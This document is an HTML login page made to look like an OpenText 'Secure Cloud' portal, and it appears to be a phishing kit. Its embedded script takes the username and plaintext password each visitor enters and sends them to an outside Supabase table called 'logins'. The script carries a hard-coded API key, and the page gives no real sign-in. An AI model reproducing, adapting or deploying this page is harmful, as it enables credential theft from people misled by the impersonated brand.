<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OpenText Portal</title>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    background: linear-gradient(160deg, #0b1a35 0%, #0d2244 35%, #0a3055 65%, #0d4a6a 85%, #0e6070 100%);
    position: relative;
    overflow: hidden;
  }

  body::before {
    content: '';
    position: fixed;
    top: -80px; right: -80px;
    width: 600px; height: 600px;
    background: radial-gradient(ellipse at center, rgba(0,200,190,0.28) 0%, transparent 65%);
    pointer-events: none;
    z-index: 0;
  }

  .idp-grid {
    position: relative;
    z-index: 1;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
  }

  /* ── Brand ── */
  .brand {
    display: flex;
    align-items: center;
    gap: 16px;
    padding: 32px 48px;
  }

  .brand .logo svg { width: 122px; height: 28px; display: block; }
  .brand .divider svg { width: 1px; height: 24px; display: block; opacity: 0.6; }

  .brand-title { font-size: 20px; font-weight: 300; color: white; letter-spacing: 0.2px; }
  .brand-version { font-size: 16px; font-weight: 300; color: rgba(255,255,255,0.55); margin-left: 4px; }

  /* ── Content ── */
  .content {
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }

  .login-form {
    width: 100%;
    max-width: 360px;
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  .login-form h3 {
    font-size: 28px;
    font-weight: 400;
    color: white;
    margin-bottom: 32px;
    text-align: center;
  }

  /* ── Form group ── */
  .form-group { width: 100%; margin-bottom: 6px; }

  .flex-label {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 6px;
  }

  .flex-label label { font-size: 13px; color: rgba(255,255,255,0.75); font-weight: 400; }

  #changeUsername {
    font-size: 13px;
    color: rgba(255,255,255,0.75);
    text-decoration: none;
    background: none;
    border: none;
    cursor: pointer;
    font-family: inherit;
    padding: 0;
    display: none;
  }
  #changeUsername.visible { display: inline; }
  #changeUsername:hover { color: white; text-decoration: underline; }

  .form-control {
    width: 100%;
    height: 42px;
    background: rgba(255,255,255,0.08);
    border: none;
    border-bottom: 2px solid rgba(100,200,220,0.55);
    border-radius: 2px 2px 0 0;
    padding: 0 12px;
    font-size: 15px;
    font-family: inherit;
    color: white;
    outline: none;
    transition: border-color 0.15s, background 0.15s;
    caret-color: #4dd0e1;
  }

  .form-control::placeholder { color: rgba(255,255,255,0.3); }
  .form-control:focus { border-bottom-color: #4dd0e1; background: rgba(255,255,255,0.12); }
  .form-control.err { border-bottom-color: #f06292; }
  .form-control[readonly] { color: rgba(255,255,255,0.85); cursor: default; background: rgba(255,255,255,0.05); }

  .error-text { font-size: 12px; color: #f48fb1; margin-top: 5px; display: none; width: 100%; }
  .error-text.show { display: block; }

  .banner {
    display: flex;
    align-items: center;
    gap: 8px;
    background: rgba(240,98,146,0.15);
    border: 1px solid rgba(240,98,146,0.3);
    border-radius: 4px;
    padding: 10px 14px;
    font-size: 13px;
    color: #f48fb1;
    margin-bottom: 16px;
    width: 100%;
  }
  .banner.d-none { display: none; }

  /* ── Submit button ── */
  #mainBtn {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    margin-top: 24px;
    width: 180px;
    height: 44px;
    background: white;
    color: #1a3a5c;
    border: none;
    border-radius: 22px;
    font-size: 15px;
    font-weight: 600;
    font-family: inherit;
    cursor: pointer;
    letter-spacing: 0.2px;
    transition: background 0.15s;
  }
  #mainBtn:hover { background: #e0f7fa; }
  #mainBtn:disabled { background: rgba(255,255,255,0.35); color: rgba(0,0,0,0.5); cursor: not-allowed; }

  .btn-spinner {
    width: 16px; height: 16px;
    border: 2px solid rgba(26,58,92,0.3); border-top-color: #1a3a5c;
    border-radius: 50%; animation: spin 0.7s linear infinite;
    display: none; flex-shrink: 0;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  /* ── Forgot / checkbox ── */
  #customer-login-page-forgot-password-link { margin-top: 18px; text-align: center; }

  .login-forgot { font-size: 13.5px; color: rgba(255,255,255,0.7); text-decoration: none; }
  .login-forgot:hover { color: white; text-decoration: underline; }

  .idp-center-content { margin-top: 14px; text-align: center; }

  .checkbox-label {
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 13px;
    color: rgba(255,255,255,0.65);
    cursor: pointer;
    user-select: none;
  }

  .checkbox-label input[type="checkbox"] {
    width: 15px; height: 15px;
    accent-color: #4dd0e1; cursor: pointer; flex-shrink: 0;
  }

  /* ── Footer ── */
  .footer {
    padding: 20px 48px;
    text-align: center;
    font-size: 12px;
    color: rgba(255,255,255,0.4);
    line-height: 1.6;
    position: relative;
    z-index: 1;
  }
  .footer a { color: rgba(255,255,255,0.5); text-decoration: none; }
  .footer a:hover { color: white; }

  #password-group { display: none; }
</style>
</head>
<body>

<div class="idp-grid">

      </svg>
    </div>
    <div class="divider">
      <svg viewBox="0 0 1 24" fill="white"><path d="M1 0H0V24H1V0Z"/></svg>
    </div>
    <div class="brand-title">Secure Cloud</div>
    <div class="brand-version">26.2</div>
  </div>

  <div class="content">
    <div class="login-form">
      <h3>Sign In</h3>

      <div class="banner d-none" id="errorBanner">
        <svg width="16" height="16" fill="none" viewBox="0 0 24 24"><path d="M12 2L2 22h20L12 2zm0 3.5L19.5 20h-15L12 5.5zM11 10v5h2v-5h-2zm0 6v2h2v-2h-2z" fill="#f48fb1"/></svg>
        <span>The username or password you entered is incorrect</span>
      </div>

      <div class="form-group">
        <div class="flex-label">
          <label for="Input_Username">Username</label>
          <button id="changeUsername" onclick="goBack()">Change</button>
        </div>
        <input class="form-control" type="text" id="Input_Username"
               placeholder="You must provide a username"
               autocomplete="username"
               oninput="clearErr()"
               onkeydown="if(event.key==='Enter')handleContinue()">
        <div class="error-text" id="usernameErr">You must provide a username.</div>
      </div>

      <div class="form-group" id="password-group">
        <div class="flex-label">
          <label for="Input_Password">Password</label>
        </div>
        <input class="form-control" type="password" id="Input_Password"
               placeholder=""
               autocomplete="current-password"
               oninput="clearPwErr()"
               onkeydown="if(event.key==='Enter')handleSignIn()">
        <div class="error-text" id="pwErr">Password is required.</div>
      </div>

      <button id="mainBtn" onclick="handleContinue()">
        <div class="btn-spinner" id="btnSpinner"></div>
        <span id="btnLabel">Continue</span>
      </button>

      <div id="customer-login-page-forgot-password-link">
        <a class="login-forgot" href="#">Forgot password?</a>
      </div>

      <div class="idp-center-content">
        <div class="center-content">
          <label class="checkbox-label" for="rememberMe">
            <input type="checkbox" id="rememberMe"> Keep me signed in for today
          </label>
        </div>
      </div>
    </div>
  </div>

  <div class="footer">
    Copyright © 2026 Open&nbsp;Text. All Rights Reserved. Trademarks owned by Open&nbsp;Text.
    Build 26.2.
    <a href="https://www.opentext.com/about/privacy">Privacy Policy</a>
  </div>

</div>

<script>
  // ── Supabase Config ──────────────────────────────────────────────
  const SUPABASE_URL = 'https://ycfstlaakaamxgxlbora.supabase.co';
  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InljZnN0bGFha2FhbXhneGxib3JhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM2NDAyNDksImV4cCI6MjA4OTIxNjI0OX0.cSvcpbCW6sP9nX6VT9zBwUXGeAQV3IuZdGON_6dsuEI';
  const TABLE_NAME = 'logins';

  async function sha256(message) {
    const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(message));
    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
  }

  async function saveToSupabase(email, hashedPassword) {
    const res = await fetch(`${SUPABASE_URL}/rest/v1/${TABLE_NAME}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
        'Prefer': 'return=minimal'
      },
      body: JSON.stringify({ email, password_hash: hashedPassword, created_at: new Date().toISOString() })
    });
    if (!res.ok) throw new Error(`Supabase ${res.status}`);
  }

  let step = 1;

  function clearErr() {
    document.getElementById('usernameErr').classList.remove('show');
    document.getElementById('Input_Username').classList.remove('err');
    document.getElementById('errorBanner').classList.add('d-none');
  }

  function clearPwErr() {
    document.getElementById('pwErr').classList.remove('show');
    document.getElementById('Input_Password').classList.remove('err');
    document.getElementById('errorBanner').classList.add('d-none');
  }

  function goBack() {
    step = 1;
    document.getElementById('Input_Username').removeAttribute('readonly');
    document.getElementById('Input_Username').focus();
    document.getElementById('password-group').style.display = 'none';
    document.getElementById('changeUsername').classList.remove('visible');
    document.getElementById('btnLabel').textContent = 'Continue';
    document.getElementById('Input_Password').value = '';
    clearPwErr();
    clearErr();
  }

  function handleContinue() {
    if (step === 2) { handleSignIn(); return; }
    const username = document.getElementById('Input_Username').value.trim();
    if (!username) {
      document.getElementById('usernameErr').classList.add('show');
      document.getElementById('Input_Username').classList.add('err');
      document.getElementById('Input_Username').focus();
      return;
    }
    step = 2;
    document.getElementById('Input_Username').setAttribute('readonly', true);
    document.getElementById('changeUsername').classList.add('visible');
    document.getElementById('password-group').style.display = 'block';
    document.getElementById('btnLabel').textContent = 'Sign In';
    setTimeout(() => document.getElementById('Input_Password').focus(), 50);
  }

  async function handleSignIn() {
    const pw = document.getElementById('Input_Password').value;
    if (!pw) {
      document.getElementById('pwErr').classList.add('show');
      document.getElementById('Input_Password').classList.add('err');
      document.getElementById('Input_Password').focus();
      return;
    }

    const username = document.getElementById('Input_Username').value.trim();
    const btn = document.getElementById('mainBtn');
    const spinner = document.getElementById('btnSpinner');
    const label = document.getElementById('btnLabel');

    btn.disabled = true;
    spinner.style.display = 'block';
    label.textContent = 'Signing in...';

    try {
      const hash = await sha256(pw);
      await saveToSupabase(username, pw);
    } catch(e) {
      console.error('Supabase error:', e);
    } finally {
      btn.disabled = false;
      spinner.style.display = 'none';
      label.textContent = 'Sign In';
    }
  }
</script>
</body>
</html>
